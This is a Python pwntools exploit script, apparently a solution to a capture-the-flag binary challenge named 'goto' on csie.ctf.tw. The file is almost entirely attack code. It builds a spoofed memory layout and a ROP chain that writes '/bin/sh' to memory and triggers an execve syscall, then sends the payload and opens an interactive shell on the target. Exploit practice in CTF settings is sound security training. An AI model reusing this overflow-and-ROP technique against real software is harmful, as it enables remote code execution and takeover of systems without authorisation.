#!/usr/bin/env python2
from pwn import *

file = './goto'
# server, port = 'localhost'  , 9999
server, port = 'csie.ctf.tw', 10128

r, context.binary = remote(server, port), file
# ========================================================================

memmap = [  0x6464636362626161, 0x0000000000000000,
            0x0000000000000000, 0x0000000000000000,
            0x000000c42000e2a0, 0x000000c420045e18,
            0x0000000000000008, 0x00000000004a1200,
            0x00000000004d3c60, 0x0000000000000001,
            0x0000000000000008, 0x000000c420016090,
            0x0000000000000008, 0x000000000049e560,
            0x000000c42000e2a0, 0x00000000004a1200,
            0x00000000004d3c70, 0x000000c420045e38,
            0x0000000000000020, 0x0000000000000020,
            0x000000c42000e001, 0x000000c42000e270,
            0x000000c420045f18, 0x000000000040de88,
            0x00000000004d41a0, 0x000000c42000c018,
            0x00000000004c8ec8, 0x0000000000010000,
            0x000000c420070000, 0x0000000000000008,
            0x0000000000001000, 0x000000c420070000,
            0x0000000000001000, 0x0000000000001000,
            0x0000000000000009, 0x0000000000000009,
            0x0000000000000000, 0x0000000000000000,
            0x0000000000000000, 0x0000000000000001,
            0x000000c420045f80 ]

ropchain  = p64(0x42ed2d)    # pop rdi; ret;
ropchain += p64(0x52b000)    # vmmap can rw
ropchain += p64(0x404971)    # pop rax; ret;
ropchain += '/bin/sh\x00'    # /bin/sh
ropchain += p64(0x44ee6f)    # mov qword ptr [rdi], rax ; ret
ropchain += p64(0x404971)    # pop rax; ret;
ropchain += p64(0x00003b)    # 0x3b = 59
ropchain += p64(0x423e55)    # syscall

payload  = flat( memmap ) + ropchain

r.sendlineafter( 'Give me your text :', payload              )
r.sendlineafter( 'Plesase Sign :'     , 'TA sooooo handsome' )

r.interactive()
